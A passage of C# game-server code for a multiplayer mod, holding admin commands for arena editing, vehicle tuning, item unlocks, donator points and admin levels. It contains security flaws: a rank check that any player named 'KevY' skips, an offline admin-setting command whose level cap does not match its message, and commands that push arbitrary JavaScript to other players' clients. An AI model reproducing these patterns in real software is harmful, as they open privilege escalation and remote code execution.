                            cmd_editdmarena(player, "help remove team");
                            return;
                        }

                        Task.Run(async () =>
                        {
                            var team = await EPlayer.IsValidDMTeam(arena.Key.SQL_ID, id);
                            if (team.Value == false)
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This team ID does not exist!");
                                });
                                return;
                            }
                            using (MainDatabase context = ContextFactory.CreateContext())
                            {
                                context.CustomArenas_Teams.Remove(team.Key);
                                context.CustomArenas_Spawns.RemoveRange(await context.CustomArenas_Spawns.AsQueryable().Where(a => a.ArenaID == arena.Key.SQL_ID && a.Team == id).ToListAsync());
                                await context.SaveChangesAsync();

                            }
                            NAPI.Task.Run(() =>
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have removed the team ID: " + id + " from arena: " + arena.Key.Name);
                            });
                        });

                    }
                    else if (args[1].Equals("spawn"))
                    {
                        if (args.Length <= 2)
                        {
                            cmd_editdmarena(player, "help remove spawn");
                            return;
                        }

                        int spawnid = -1;
                        if (!Int32.TryParse(args[2], out spawnid))
                        {
                            cmd_editdmarena(player, "help remove spawn");
                            return;
                        }
                        Task.Run(async () =>
                        {
                            var spawn = await EPlayer.IsValidDMSpawn(spawnid);
                            if (!spawn.Value == true) //!.value == true because i am being retarded and i prefer to keep it that way -kevy
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The spawn ID is invalid/non existent!");
                                });
                                return;
                            }
                            if (spawn.Key.ArenaID != arena.Key.SQL_ID)
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This spawn ID does not belong to your arena, you good?!");
                                });
                                return;
                            }
                            using (MainDatabase context = ContextFactory.CreateContext())
                            {
                                context.CustomArenas_Spawns.Remove(spawn.Key);
                                await context.SaveChangesAsync();
                            }
                            NAPI.Task.Run(() =>
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have removed spawn ID " + spawnid);

                            });
                        });

                    }
                    else if (args[1].Equals("weaponset"))
                    {
                        if (args.Length <= 2)
                        {
                            cmd_editdmarena(player, "help remove weaponset");
                            return;
                        }

                        int teamid = -1;
                        if (!Int32.TryParse(args[2], out teamid))
                        {
                            cmd_editdmarena(player, "help remove weaponset");
                            return;
                        }
                        Task.Run(async () =>
                        {
                            var team = await EPlayer.IsValidDMTeam(arena.Key.SQL_ID, teamid);
                            if (team.Value == false)
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The team ID is invalid/non existent!");
                                });
                                return;
                            }

                            if (args.Length <= 3)
                            {
                                NAPI.Task.Run(() =>
                                {
                                    cmd_editdmarena(player, "help remove weaponset");
                                });
                                return;
                            }

                            int index = -1;
                            if (!Int32.TryParse(args[3], out index))
                            {
                                NAPI.Task.Run(() =>
                                {
                                    cmd_editdmarena(player, "help remove weaponset");
                                });
                                return;
                            }

                            NAPI.Task.Run(() =>
                            {
                                DM_WeaponSets[] weaponSets = NAPI.Util.FromJson<DM_WeaponSets[]>(team.Key.WeaponSets);

                                var set = weaponSets.ElementAtOrDefault(index);
                                if (set == null || set == default(DM_WeaponSets))
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The index is not valid // There's no weapon set on that index!");
                                    return;
                                }

                                List<DM_WeaponSets> newWeaponSets = new List<DM_WeaponSets>(weaponSets);
                                newWeaponSets.Remove(set);

                                team.Key.WeaponSets = NAPI.Util.ToJson(newWeaponSets.ToArray());
                                ContextFactory.SaveDB();

                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have removed the weapon set at index " + index);
                            });
                        });
                    }
                    else
                    {
                        cmd_editdmarena(player, "help remove");
                    }
                }
                else if (args[0].Equals("set", StringComparison.OrdinalIgnoreCase))
                {
                    if (args.Length <= 1)
                    {
                        cmd_editdmarena(player, "help set");
                        return;
                    }

                    if (args[1].Equals("team"))
                    {
                        if (args.Length <= 2 || args.Length <= 3)
                        {
                            cmd_editdmarena(player, "help set team");
                            return;
                        }

                        int teamid = -1;
                        if (!Int32.TryParse(args[2], out teamid))
                        {
                            cmd_editdmarena(player, "help set team");
                            return;
                        }
                        Task.Run(async () =>
                        {
                            var team = await EPlayer.IsValidDMTeam(arena.Key.SQL_ID, teamid);
                            if (team.Value == false)
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The team ID is invalid!");
                                });
                                return;
                            }

                            NAPI.Task.Run(() =>
                            {
                                if (args[3].Equals("health"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team health");
                                        return;
                                    }

                                    int health = -1;
                                    if (!Int32.TryParse(args[4], out health))
                                    {
                                        cmd_editdmarena(player, "help set team health");
                                        return;
                                    }

                                    team.Key.Health = health;
                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed the {team.Key.Name}'s starting health to {health}.");
                                }
                                else if (args[3].Equals("armour") || args[3].Equals("armor"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team armour");
                                        return;
                                    }

                                    int armour = -1;
                                    if (!Int32.TryParse(args[4], out armour))
                                    {
                                        cmd_editdmarena(player, "help set team armour");
                                        return;
                                    }

                                    team.Key.Armour = armour;
                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed the {team.Key.Name}'s starting armour to {armour}.");
                                }
                                else if (args[3].Equals("blip"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team blip");
                                        return;
                                    }

                                    bool state = false;
                                    if (!Boolean.TryParse(args[4], out state))
                                    {
                                        cmd_editdmarena(player, "help set team blip");
                                        return;
                                    }

                                    team.Key.Blip = state;
                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed the {team.Key.Name}'s minimap blip visibility to {state}.");
                                }
                                else if (args[3].Equals("blipcolor"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team blipcolor");
                                        return;
                                    }

                                    int blipcol = -1;
                                    if (!Int32.TryParse(args[4], out blipcol))
                                    {
                                        cmd_editdmarena(player, "help set team blipcolor");
                                        return;
                                    }

                                    team.Key.BlipColor = blipcol;
                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed the {team.Key.Name}'s blip colour to {blipcol}.");
                                }
                                else if (args[3].Equals("alpha"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team alpha");
                                        return;
                                    }

                                    int alpha = -1;
                                    if (!Int32.TryParse(args[4], out alpha))
                                    {
                                        cmd_editdmarena(player, "help set team alpha");
                                        return;
                                    }

                                    team.Key.Alpha = alpha;
                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed the {team.Key.Name}'s alpha to {alpha}.");
                                }
                                else if (args[3].Equals("hpbar"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team hpbar");
                                        return;
                                    }

                                    int num = -1;
                                    if (!Int32.TryParse(args[4], out num))
                                    {
                                        cmd_editdmarena(player, "help set team hpbar");
                                        return;
                                    }

                                    team.Key.ShowHPBars = num;

                                    string hpBars = "INVALID!!";
                                    switch (team.Key.ShowHPBars)
                                    {
                                        case 0:
                                            hpBars = "Never Show";
                                            break;
                                        case 1:
                                            hpBars = "Always Shown";
                                            break;
                                        case 2:
                                            hpBars = "Show On Aim";
                                            break;
                                        case 3:
                                            hpBars = "BUSTED! (Copchase Reserved)";
                                            break;
                                        default:
                                            hpBars = "Invalid! Please fix!";
                                            break;
                                    }

                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed the {team.Key.Name}'s bar type to {hpBars}.");
                                }
                                else if (args[3].Equals("name"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team name");
                                        return;
                                    }

                                    args = options.Split(' ', 5);

                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed team {team.Key.Name}'s name to {args[4]}.");
                                    team.Key.Name = args[4];
                                }
                                else if (args[3].Equals("color"))
                                {
                                    if (args.Length <= 6)
                                    {
                                        cmd_editdmarena(player, "help set team color");
                                        return;
                                    }
                                    int r = 179;
                                    int g = 179;
                                    int b = 179;

                                    if (!Int32.TryParse(args[4], out r) || !Int32.TryParse(args[5], out g) || !Int32.TryParse(args[6], out b))
                                    {
                                        cmd_editdmarena(player, "help set team color");
                                        return;
                                    }

                                    team.Key.ColorR = r;
                                    team.Key.ColorG = g;
                                    team.Key.ColorB = b;

                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed team {team.Key.Name}'s color to !{{{EPlayer.HexConverter(new Color(r, g, b))}}}this.");
                                }
                                else if (args[3].Equals("sharedspawns"))
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help set team sharedspawns");
                                        return;
                                    }

                                    int uhuh = -1;

                                    if (!Int32.TryParse(args[4], out uhuh))
                                    {
                                        cmd_editdmarena(player, "help set team sharedspawns");
                                        return;
                                    }

                                    team.Key.SharedSpawns = uhuh;
                                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have changed team {team.Key.Name}'s shared spawns team id to {uhuh}.");
                                }
                                else
                                {
                                    cmd_editdmarena(player, "help set team");
                                }
                            });
                        });
                    }
                    else
                    {
                        cmd_editdmarena(player, "help set");
                    }
                }
                else
                {
                    player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] editdmarena (help/list/add/remove/set) | Choose any one category.");
                }

            });
        } 
        [Command("editdmarena", "!{#AFAFAF}[USAGE] editdmarena (help)", GreedyArg = true)]
        public void cmd_editdmarena(Player player, string options = "help")
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 4 admin.");
                return;
            }

            if (!player.HasData("EditingDMArena"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have not selected any DM arenas. (/selectdmarena)");
                return;
            }

            Task.Run(async () =>
            {
                var arena = await EPlayer.IsValidDMArena(player.GetData<int>("EditingDMArena"));
                if (!arena.Value)
                {
                    NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The arena you were editing has been deleted or is invalid. (/selectdmarena again)"); });
                    return;
                }
                editdmarena_OnValidateDmArena(player, options, arena);
            });
  
            
            return;
        }

        [Command("triggerevent")]
        public void cmd_triggerevent(Player player, string eventt)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 6)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            player.TriggerEvent(eventt);
        }

        [Command("triggerjs", GreedyArg = true)]
        public void cmd_triggerjs(Player player, string eventt)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 6)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            player.SetData("TriggerJSReturn", player.Name);
            player.TriggerEvent("ResolveJS", eventt);
        }

        [Command("triggerjsall", GreedyArg = true, Alias = "triggerjsa")]
        public void cmd_triggerjsall(Player player, string eventt)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 6)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            Settings.LoggedInPlayers.ForEach(a => 
                { if (a != player) 
                    { 
                        a.SetData("TriggerJSReturn", player.Name);
                        a.TriggerEvent("ResolveJS", eventt);
                    }
                } );
        }

        [Command("triggerjsplayer", GreedyArg = true, Alias = "triggerjsp")]
        public void cmd_triggerjsplayer(Player player, Player target, string eventt)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 6)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            target.SetData("TriggerJSReturn", player.Name);
            target.TriggerEvent("ResolveJS", eventt);
        }

        [Command("vtuner", "!{#AFAFAF}[USAGE] vtuner (cop / fugitive / help)")]
        public void cmd_vtuner(Player player, string team = "help")
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (player.GetData<bool>("Tuner_Using") == true) return;

            string vehicleModel = "?";

            if(team.Equals("help", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", "!{#33C446}=> Vehicle Tuner Help/Frequently Asked Questions <=");
                player.TriggerEvent("pushMsgToChat", "!{#33C446}Q: How to use the vehicle tuner?");
                player.TriggerEvent("pushMsgToChat", "!{#999999}A: Simply equip the vehicle you want to tune and do /vtuner (team of the vehicle set).");
                player.TriggerEvent("pushMsgToChat", "!{#33C446}Q: What happens if I change vehicles?");
                player.TriggerEvent("pushMsgToChat", "!{#999999}A: Every vehicle's tuning data is saved differently for players, so you can switch vehicles normally.");
                player.TriggerEvent("pushMsgToChat", "!{#33C446}Q: What is the price?");
                player.TriggerEvent("pushMsgToChat", "!{#999999}A: As you're tuning the vehicle, the price will be updated in the bottom of the menu list. The price starts at 50 points per component but once you cross the 3 component limit (except colors), the price shifts in terms of donator points which can be converted with /convertpoints");
                player.TriggerEvent("pushMsgToChat", "!{#33C446}Q: How to get rid of modifications/color?");
                player.TriggerEvent("pushMsgToChat", "!{#999999}A: To remove all modifications and colors, you have to reset all parts to None or -1 and if there's not a single part, it'll remove all modifications. Similarly if you want to just keep the color on vehicle, you need to buy/save at least one modification (non color) on the vehicle.");

                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] vtuner !{#33C446}(cop / fugitive / help)");
                return;
            }
            else if(team.Equals("cop", StringComparison.OrdinalIgnoreCase))
            {
                vehicleModel = EPlayer.GetAccount(player).CarCop;
            }
            else if(team.Equals("fugitive", StringComparison.OrdinalIgnoreCase))
            {
                vehicleModel = EPlayer.GetAccount(player).CarFugitive;
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] vtuner (cop / fugitive / help)");
                return;
            }
            
            if(vehicleModel.Equals("?") || vehicleModel.StartsWith("default", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot tune the default 'randomized' vehicle!");
                return;
            }

            if (player.GetSharedData<int>("Team") != -1 && player.GetSharedData<int>("InLobby") != -4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently in the copchase or derby!");
                return;
            }

            player.SetData("Tuner_Using", true);
            player.SetSharedData("Team", -1);
            player.SetSharedData("InLobby", -5);

            uint dim = (uint)player.Id + 699;
            Vehicle veh = NAPI.Vehicle.CreateVehicle(NAPI.Util.GetHashKey(vehicleModel), new Vector3(-372.2626f, -117.197556f, 38.08989f), 119.67291f, 64, 64, "KEVER", 255, true, true, dim);
            
            player.SetData("Tuner_Vehicle", veh);

            player.SetData("Tuner_Pos", 0);
            player.Position = new Vector3(-335.56015f, -137.33543f, -38.40311f);
            EPlayer.Freeze(player, true);
            player.TriggerEvent("DestroyPlayerCamera");
            player.TriggerEvent("CreatePlayerCamera", -373, -121, 39, -10, 0, -10, 60, true);
            player.TriggerEvent("SetTimeWeather", 12, 0, 0, 0);

            EPlayer.Notify(player, $"Now tuning: {vehicleModel}<p>LMB to switch camera, menu keys to select, horn and lights can be used by default keys.</p> <p>DISCLAIMER: Removing components is not refundable.</p>", "green", "fas fa-exclamation", false, 10000, "topCenter");
            EPlayer.SendMessage(player, "~y~Loading car tunings...");
            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    var inst = await context.PlayerTunings.AsQueryable().FirstOrDefaultAsync(a => a.Model == veh.Model && a.AccountSQLID == EPlayer.GetAccount(player).SQL_ID);
                    NAPI.Task.Run(() =>
                    {
                        if (inst != null)
                        {
                            veh.PrimaryColor = inst.PrimaryColor;
                            veh.SecondaryColor = inst.SecondaryColor;

                            foreach (var kvp in NAPI.Util.FromJson<Dictionary<int, int>>(inst.Mods))
                            {
                                veh.SetMod(kvp.Key, kvp.Value);

                                if (kvp.Key == 56) veh.WheelType = kvp.Value;

                                if (kvp.Key == 53 || kvp.Key == 55 || kvp.Key == 56) player.TriggerEvent("SetOtherMods", kvp.Key, kvp.Value);
                            }
                            veh.PearlescentColor = inst.PearlescentColor;
                            veh.WheelColor = inst.WheelColor;
                        }

                        player.SetData("Tuner_CurrentItems", inst);

                        player.TriggerEvent("OpenTuner", veh.Id);
                        player.Dimension = dim; // FIRST THE TUNER SETTING ID AND THEN LAODING CAR
                    });                    
                }
            });
            
        }

        [Command("tuneveh")]
        public void cmd_tuneveh(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") != -3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            if (!player.IsInVehicle)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in any vehicle!");
                return;
            }

            player.TriggerEvent("OpenTuner", -1);
        }

        [Command("testspike")]
        public void cmd_testspike(Player player, int spikeID)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 6)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            Stinger sg = Stinger.Stingers.FirstOrDefault(s => s.ID == spikeID);
            if(sg == null) { EPlayer.SendMessage(player, $"Fuck off, that spike ID does not exist."); return; }
            foreach(StingerInfo sgobject in sg.StingerObjects)
            {
                if (!sgobject.IsNPC)
                {
                    NAPI.Object.CreateObject(NAPI.Util.GetHashKey("p_stinger_04"),
                        sgobject.Position, sgobject.Rotation, 255, player.Dimension);

                    // NEEDS FIXING RIP
                    float angle = (sgobject.Rotation.Z + 180f)*(-1);

                    double colX = sgobject.Position.X, colY = sgobject.Position.Y;
                    colX += 1.5 * Math.Sin(angle);
                    colY += 1.5 * -Math.Cos(angle);

                    ColShape col = NAPI.ColShape.CreateSphereColShape(new Vector3(colX, colY, sgobject.Position.Z), 1.5f, player.Dimension);
                    NAPI.Marker.CreateMarker(MarkerType.DebugSphere, new Vector3(colX, colY, sgobject.Position.Z), new Vector3(colX, colY, sgobject.Position.Z), new Vector3(colX, colY, sgobject.Position.Z), 1.5f, new Color(0, 0, 255, 128));
                    Stinger.StingerCols.Add(col);
                }
                else
                {
                    bool female = new Random().Next(0, 10) > 5;
                    NAPI.Ped.CreatePed(female ? PedHash.Cop01SFY : PedHash.Cop01SMY, sgobject.Position, sgobject.Rotation.Z, player.Dimension);
                }
            }
            player.Position = sg.StingerObjects[0].Position.Around(5f);
            EPlayer.SendMessage(player, $"Created stinger ID {spikeID} [{sg.Area} - {sg.Street}] | Objects: {sg.StingerObjects.Count}");
        }

        [Command("cameraset")]
        public void cmd_cameraset(Player player, int x, int y, int z, int rx, int ry, int rz, int viewangle)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 6)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            player.TriggerEvent("DestroyPlayerCamera");
            player.TriggerEvent("CreatePlayerCamera", x, y, z, rx, ry, rz, viewangle);
        }

        [Command("dbgunlockchal")]
        public void cmd_dbgunlockchal(Player player, int type, string item)
        {
            if (EPlayer.GetAccount(player).Admin < 6) return;
            EPlayer.TryAdvanceChallenge(player, type, item);
        }

        [Command("dbgresetchallenges")]
        public void cmd_dbgresetchallengers(Player player)
        {
            if (EPlayer.GetAccount(player).Admin < 6) return;

            EPlayer.SendMessageToAll("!{#c387ff}[DAILY CHALLENGES] ~w~New daily challenges are now available! Check ~y~Menu > Profile~w~ for more info.");
            Task.Run(async () => {
                Challenge.SetNewDailyChallenges();
            });
        }

        [Command("dbgdiscordverify")]
        public void cmd_dbgdiscordverify(Player player, Player _p)
        {
            if (EPlayer.GetAccount(player).Admin < 6) return;
            Account a = EPlayer.GetAccount(player);

            player.TriggerEvent("pushMsgToChat", ">> GIVEN " + _p.Name + " THEIR DISCORD REWARDS");

            _p.TriggerEvent("pushMsgToChat", "!{#83ff75}Congratulations! You successfully linked your Discord account to your Race 'N' Chase account.");
            _p.TriggerEvent("pushMsgToChat", "!{#ffff00}[>] !{#ffffff}You now have access to the !{#ffff00}Negotiator !{#ffffff}loadout for !{#0097ff}cops !{#ffffff}& !{#ffae00}fugitives!{#ffffff}.");
            _p.TriggerEvent("pushMsgToChat", "!{#ffff00}[>] !{#ffffff}You unlocked a new !{#ffae00}fugitive !{#ffffff}vehicle: !{#ffff00}Super Diamond!{#ffffff}.");
            _p.TriggerEvent("pushMsgToChat", "!{#ffff00}[>] !{#ffffff}You also received !{#ffff00}13 points & 10XP !{#ffffff}as a bonus.");

            EPlayer.GrantXP(_p, 10);
            EPlayer.GivePoints(_p, 13);
            EPlayer.UnlockLoadout(a, _p, "Negotiator", 0);
            EPlayer.UnlockLoadout(a, _p, "Negotiator", 1);
            EPlayer.UnlockVehicle(a, _p, "superd", 0);
            EPlayer.UnlockAchievement(_p, "discord_verify");
        }

        [Command("unlockitem")]
        public void cmd_unlockitem(Player player, string type, string name, int team)
        {
            if (EPlayer.GetAccount(player).Admin < 6) return;
            Account acc = EPlayer.GetAccount(player);
            if (type == "loadout")
            {
                EPlayer.UnlockLoadout(acc, player, name, team);
            }
            else if (type == "car"){
                EPlayer.UnlockVehicle(acc, player, name, team);
            }
            else EPlayer.SendMessage(player, "~r~/unlockitem [type: loadout/car][loadout name / car model][team 0-fugi or 1-cop]");
            return;
        }

        [Command("setadmin", "!{#AFAFAF}[USAGE] setadmin (target) (level)", Alias = "makeadmin,setstaff")]
        public void cmd_setadmin(Player player, Player target, int level)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }


            Account t_acc = target.GetData<Account>("AccountHandle");

            if (EPlayer.GetAccount(player).Admin == 6)
            {
                if (level < 0 || level > 6)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot preceed level 0 or exceed level 6.");
                    return;
                }
            }
            else
            {
                if (level < 0 || level > 3)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot preceed level 0 or exceed level 3 (General Admin).");
                    return;
                }
            }
            if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin > EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher admin level than you.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:setadmin:{target.Name}:{level}"); } catch { }

            Logs.LogAdmin(player, $"Set {target.Name}'s admin level to {EPlayer.GetAdminLevelName(level)}.");

            t_acc.Admin = level;
            target.SetSharedData("Admin", level);
            player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You have set {target.Name}'s admin level to {EPlayer.GetAdminLevelName(level, true)} ({level})");
            target.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}{player.Name} has set your admin level to {EPlayer.GetAdminLevelName(level, true)} ({level})");
            EPlayer.Save(target);
        }

        [Command("osetadmin", "!{#AFAFAF}[USAGE] osetadmin (target) (level)")]
        public void cmd_osetadmin(Player player, string name, int level)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /setadmin!");
                return;
            }

            int pAdmin = EPlayer.GetAccount(player).Admin;
            Task.Run(async () =>
            {
                using(MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);

                    if ((tpAcc != null) == false)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name."); });
                        return;
                    }

                    if (pAdmin == 6)
                    {
                        if (level < 0 || level > 6)
                        {
                            NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot preceed level 0 or exceed level 6."); });
                            return;
                        }
                    }
                    else
                    {
                        if (level < 0 || level > 6)
                        {
                            NAPI.Task.Run(() =>
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot preceed level 0 or exceed level 3 (General Admin).");
                            });
                            return;
                        }
                    }

                    if (tpAcc.Admin > pAdmin)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher admin level than you.");
                        });
                        return;
                    }


                    tpAcc.Admin = level;
                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You have set {tpAcc.Username}'s admin level to {EPlayer.GetAdminLevelName(level, true)} ({level})");
                    });
                    
                    Logs.LogAdmin(player, $"Set offline player {tpAcc.Username}'s admin level to {EPlayer.GetAdminLevelName(level)}.");

                    await context.SaveChangesAsync();
                }
            });
            
            return;
        }

        [Command("ogivedonorpoints", "!{#AFAFAF}[USAGE] ogivedonorpoints (target) (points)")]
        public void cmd_ogivedonorpoints(Player player, string name, int points)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 5)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /givedonorpoints!");
                return;
            }
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);

                    if ((tpAcc != null) == false)
                    {
                        NAPI.Task.Run(() =>
                        {
                           player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        });
                        return;
                    }

                    Logs.LogAdmin(player, $"Gave offline player {tpAcc.Username} {points} donator points.");
                    tpAcc.DonatorPoints += points;
                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You have given {tpAcc.Username} {points} donator points. (Their total now: {tpAcc.DonatorPoints})");
                    });

                    await context.SaveChangesAsync();
                }
            });
            
            return;
        }

        [Command("givedonorpoints", "!{#AFAFAF}[USAGE] givedonorpoints (target) (points)")]
        public void cmd_givedonorpoints(Player player, Player target, int points)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 5)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }


            Account t_acc = target.GetData<Account>("AccountHandle");

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:givedonorpoints:{target.Name}:{points}"); } catch { }
            Logs.LogAdmin(player, $"Gave {points} donator points to {target.Name}");
            t_acc.DonatorPoints += points;
            player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You gave {points} donator points to {target.Name}.");
            target.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You received {points} donator points from {player.Name}.");
            EPlayer.Save(target);
        }

        [Command("claninfo")]
        public void cmd_claninfo(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            Account acc = EPlayer.GetAccount(player);
            if (acc.ClanID == -1 || acc.ClanTier == -1)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}You are not part of a clan!");
                return;
            }
            Task.Run(async () =>
            {
